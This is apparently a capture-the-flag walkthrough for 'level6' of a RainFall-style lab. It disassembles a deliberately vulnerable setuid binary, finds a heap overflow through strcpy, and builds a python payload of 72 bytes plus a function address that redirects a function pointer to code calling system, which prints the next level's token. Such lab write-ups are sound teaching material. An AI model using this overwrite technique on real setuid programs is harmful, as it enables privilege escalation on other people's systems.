# level6 walkthrough
There is setuid binary, lets disassemble it:

    Dump of assembler code for function main:
    0x0804847c <+0>:	push   ebp
    0x0804847d <+1>:	mov    ebp,esp
    0x0804847f <+3>:	and    esp,0xfffffff0
    0x08048482 <+6>:	sub    esp,0x20
    0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
    0x0804848c <+16>:	call   0x8048350 <malloc@plt>
    0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
    0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
    0x0804849c <+32>:	call   0x8048350 <malloc@plt>
    0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
    0x080484a5 <+41>:	mov    edx,0x8048468
    0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
    0x080484ae <+50>:	mov    DWORD PTR [eax],edx
    0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
    0x080484b3 <+55>:	add    eax,0x4
    0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
    0x080484b8 <+60>:	mov    edx,eax
    0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
    0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
    0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
    0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
    0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
    0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
    0x080484d0 <+84>:	call   eax
    0x080484d2 <+86>:	leave
    0x080484d3 <+87>:	ret
    End of assembler dump.

We already can spot vulnerable strcpy call from first command line argument (which could be very large) into buffer of 64 bytes allocated on heap.
There is another buffer of 4 bytes which is being allocated after the first one, thus it's laying after the first buffer.
Small buffer contains address of local function which is called from that buffer. We can find it by listing all functions:

    (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x080482f4  _init
    0x08048340  strcpy
    0x08048340  strcpy@plt
    0x08048350  malloc
    0x08048350  malloc@plt
    0x08048360  puts
    0x08048360  puts@plt
    0x08048370  system
    0x08048370  system@plt
    0x08048380  __gmon_start__
    0x08048380  __gmon_start__@plt
    0x08048390  __libc_start_main
    0x08048390  __libc_start_main@plt
    0x080483a0  _start
    0x080483d0  __do_global_dtors_aux
    0x08048430  frame_dummy
    0x08048454  n
    0x08048468  m
    0x0804847c  main
    ...

This m function is useless for us:

    (gdb) disass m
    Dump of assembler code for function m:
    0x08048468 <+0>:	push   ebp
    0x08048469 <+1>:	mov    ebp,esp
    0x0804846b <+3>:	sub    esp,0x18
    0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1
    0x08048475 <+13>:	call   0x8048360 <puts@plt>
    0x0804847a <+18>:	leave
    0x0804847b <+19>:	ret
    End of assembler dump.

It just prints "Nope" string. But there is also not used n function:

    (gdb) disass n
    Dump of assembler code for function n:
    0x08048454 <+0>:	push   ebp
    0x08048455 <+1>:	mov    ebp,esp
    0x08048457 <+3>:	sub    esp,0x18
    0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0
    0x08048461 <+13>:	call   0x8048370 <system@plt>
    0x08048466 <+18>:	leave
    0x08048467 <+19>:	ret
    End of assembler dump.

It contains code which would get us token for the next level if we manage to overwrite small buffer with address of this function.
To do that we need to examine heap space:

    (gdb) b *main+21
    Breakpoint 6 at 0x8048491
    (gdb) b *main+37
    Breakpoint 7 at 0x80484a1
    (gdb) b *main+84
    Breakpoint 8 at 0x80484d0
    (gdb) r aaabbbbcccc
    Starting program: /home/user/level6/level6 aaabbbbcccc

    Breakpoint 6, 0x08048491 in main ()
    (gdb) i r eax
    eax            0x804a008	134520840
    (gdb) c
    Continuing.

    Breakpoint 7, 0x080484a1 in main ()
    (gdb) i r eax
    eax            0x804a050	134520912
    (gdb) c
    Continuing.

    Breakpoint 8, 0x080484d0 in main ()
    (gdb) i r eax
    eax            0x8048468	134513768

Bigger buffer address is 0x804a008, smaller buffer address is 0x804a050 and it contains m function address which is 0x8048468.
We can calculate distance between them just by subtracting 0x804a050-0x804a008=0x48 (72 bytes: 64 bytes is bigger buffer and there is 8 byte gap before smaller buffer).
To have better picture of what's going on we can print out heap memory:

    (gdb) x/20x 0x804a008
    0x804a008:	0x62616161	0x63626262	0x00636363	0x00000000
    0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a048:	0x00000000	0x00000011	0x08048468	0x00000000

Here we can see our symbols provided from command line inside bigger buffer, and m function address inside smaller buffer.
To obtain token for the next level we need to generate 72 random bytes, append to them n function address in little endian and provide this string as first argument:

    level6@RainFall:~$ python -c 'print("a"*72 + "\x54\x84\x04\x08")' > /tmp/level6/exploit
    level6@RainFall:~$ ./level6 $(cat /tmp/level6/exploit)
    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

